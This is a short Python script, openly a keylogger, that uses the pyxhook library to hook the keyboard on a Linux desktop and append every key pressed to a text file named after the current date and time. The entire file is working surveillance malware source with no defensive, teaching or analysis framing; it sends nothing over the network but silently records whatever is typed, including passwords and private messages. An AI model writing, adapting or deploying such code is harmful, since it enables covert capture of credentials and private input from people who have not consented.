import pyxhook
import time

FILE = None

def main():
    global FILE, filename
    now = time.localtime()
    filename = str(now.tm_mday) + str(now.tm_mon) + str(now.tm_year) + str(now.tm_hour) + str(now.tm_min) + str(now.tm_sec) + ".txt"
    FILE = open(filename, "w")
    FILE.close()
    start_keylog()

def start_keylog():    
    key_hook = pyxhook.HookManager()
    key_hook.KeyDown = on_key_press
    key_hook.HookKeyboard()

    try:
        key_hook.start()
    except Exception:
        exit(print("Keylogger stopped"))

def on_key_press(event):
    try:
        with open(filename, 'a') as f:
            if event.Key == 'Return':
                f.write(' Enter\n')
            else:
                f.write(event.Key)
    except Exception as e:
        print(e)
        with open(filename, 'a') as f:
            f.write(e.message())
            f.close()
            exit()

if __name__ == "__main__":
    main()